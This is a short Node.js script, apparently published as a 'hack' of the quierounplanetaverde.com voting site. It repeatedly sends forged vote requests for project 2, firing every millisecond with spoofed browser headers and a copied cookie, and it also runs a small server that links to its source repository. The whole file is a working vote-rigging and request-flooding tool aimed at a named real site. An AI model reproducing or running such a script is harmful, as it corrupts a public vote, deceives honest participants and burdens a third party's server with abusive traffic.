var http	= require('http');
var query 	= require('querystring');
var count = 0;

var data = query.stringify({
    proyecto_id: 2
});

var options = {
    hostname: 'quierounplanetaverde.com'
    ,port: 80
    ,path: '/votar-proyecto'
    ,method: 'POST'
    ,headers: {
        'Accept':'application/json, text/javascript, */*; q=0.01'
        ,'Accept-Language':'en-US,en;q=0.8,es;q=0.6'
        ,'Connection':'keep-alive'
        ,'Content-Length':'13'
        ,'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'
        ,'Cookie':'__utma=7833202.1968533372.1383310544.1383310544.1385033544.1; __utmb=7857332.8.10.1383310544; __utmc=7833202; __utmz=7833202.1383310544.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'
        ,'Host':'quierounplanetaverde.com'
        ,'Origin':'http://quierounplanetaverde.com'
        ,'Referer':'http://quierounplanetaverde.com/separtedelasolucion'
        ,'User-Agent':'Mozilla/4.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/337.36'
        ,'X-Requested-With':'XMLHttpRequest'
    }
};

var vote = function() {

    var req = http.request(options, function(res) {
        //res.setEncoding('utf8');
        res.on('data', function (chunk) {
            count++;
            console.log('['+count+'] BODY: ' + chunk );
        });
    });

    req.write(data);

    req.on('error', function(e) {
        console.log('problem with request: ' + e.message);
    });

    req.end();

}

setInterval(vote,1);


var http = require('http');
http.createServer(function (req, res) {
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.end('Check the source on: <a href="https://github.com/paulomcnally/quierounplanetaverde-hack">https://github.com/paulomcnally/quierounplanetaverde-hack</a>');
}).listen(process.env.VMC_APP_PORT || 1337, null);